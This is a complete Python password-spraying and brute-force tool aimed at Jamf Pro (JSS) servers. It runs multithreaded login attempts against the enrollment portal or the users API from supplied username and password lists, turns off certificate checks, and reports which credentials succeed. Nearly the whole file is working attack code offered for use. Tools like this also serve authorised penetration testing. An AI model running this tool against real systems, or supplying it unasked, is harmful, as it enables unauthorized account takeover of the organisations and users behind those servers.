import requests
import argparse
import sys
import time
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed
from time import sleep
from urllib3.exceptions import InsecureRequestWarning
from multiprocessing.pool import ThreadPool as Pool

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

headers = {
    'Connection': 'close',
    'Cache-Control': 'max-age=0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
}

def print_debug(msg):
    if args.debug:
        print((bcolors.OKBLUE + "[%] %s" + bcolors.ENDC) % msg)

def do_authentication(username, password):
    data = 'lastPage=login.jsp&payload=&device-detect-complete=&username={}&password={}'.format(username, password)
    r = requests.post(args.jss, headers=headers, data=data, verify=False, allow_redirects=False)

    if r.status_code == 302:
        tqdm.write(("[*] %s:%s " + bcolors.OKGREEN + "(success)" + bcolors.ENDC) % (username, password))

def do_authentication_api(username, password):
    r = requests.get(api_url, headers=headers, auth=(username, password), verify=False)
    
    if "WWW-Authenticate" not in r.headers:
        if "Unauthorized" in r.text:
            tqdm.write(("[*] %s:%s " + bcolors.OKGREEN + "(success)" + bcolors.ENDC) % (username, password))
        else:
            tqdm.write(("[*] %s:%s " + bcolors.OKGREEN + "(success - API access)" + bcolors.ENDC) % (username, password))
    
        
parser = argparse.ArgumentParser(description="Password Spray a target\'s Jamf installation.")
parser.add_argument('jss', help='URL of the JSS')
parser.add_argument('--username', nargs='?', default=None, help='Username to spray')
parser.add_argument('--username-list', nargs='?', default=None, help='File containing usernames to spray')
parser.add_argument('--password', nargs='?', default=None, help='Password to spray')
parser.add_argument('--password-list', nargs='?', default=None, help='File containing passwords to spray')
parser.add_argument('--threads', nargs='?', default=20, help='Number of threads to use (default=20)')
parser.add_argument('--swap', action='store_true', default=False, help='Thread on passwords rather than usernames, useful for brute forcing')
parser.add_argument('--api', action='store_true', default=False, help='Use the API method of password spraying rather than the enrollment portal.')

args = parser.parse_args()

if not args.jss.endswith("/"):
    args.jss += "/"

api_url = args.jss + "JSSResource/users"
args.jss += "enroll/"

if args.username is None and args.username_list is None:
    print("[!] Must supply either --username or --username-list options.")

if args.password is None and args.password_list is None:
    print("[!] Must supply either --password or --password-list options.")

if args.username_list is None:
    usernames = [args.username]
else:
    with open(args.username_list) as f:
        usernames = [x.strip() for x in f.readlines()]

if args.password_list is None:
    passwords = [args.password]
else:
    with open(args.password_list) as f:
        passwords = [x.strip() for x in f.readlines()]

if args.api:
    print("[*] JSS API URL: %s" % api_url)
else:
    print("[*] JSS URL: %s" % args.jss)

try:
    s = requests.Session()
    r = s.get(args.jss, headers=headers, verify=False)

    if r.status_code == 200:
        print("[*] Status: " + bcolors.OKGREEN + "Up" + bcolors.ENDC)
        
    else:
        raise Exception("Initial checks returned HTTP status code: %i." % r.status_code)
except Exception as e:
    print("[!] Status: " + bcolors.FAIL + "Down or Unreachable" + bcolors.ENDC)
    print("[!] Error: %s" % e)
    sys.exit()


print("[*] Attempting authentication requests for %i usernames with %i passwords (%i total)." % (len(usernames), len(passwords), len(usernames)*len(passwords)))

confirmation = input("[?] Ready? [y/N] ")

if confirmation.lower() != "y":
    print("[!] " + bcolors.FAIL + "Aborting" + bcolors.ENDC)
    sys.exit()

if args.api:
    auth_function = do_authentication_api
else:
    auth_function = do_authentication

if args.swap:
    for i, username in enumerate(usernames):
        print("[*] Attempting '%s' (%i/%i)" % (username, i + 1, len(usernames)))

        p = ThreadPoolExecutor(max_workers=int(args.threads))
        futures = []

        for password in passwords:
            futures.append(p.submit(auth_function, username, password))
            
        for f in tqdm(as_completed(futures), leave=True, total=len(futures)):
            pass
else:
    for i, password in enumerate(passwords):
        print("[*] Attempting '%s' (%i/%i)" % (password, i + 1, len(passwords)))

        p = ThreadPoolExecutor(max_workers=int(args.threads))
        futures = []

        for username in usernames:
            futures.append(p.submit(auth_function, username, password))
            
        for f in tqdm(as_completed(futures), leave=True, total=len(futures)):
            pass
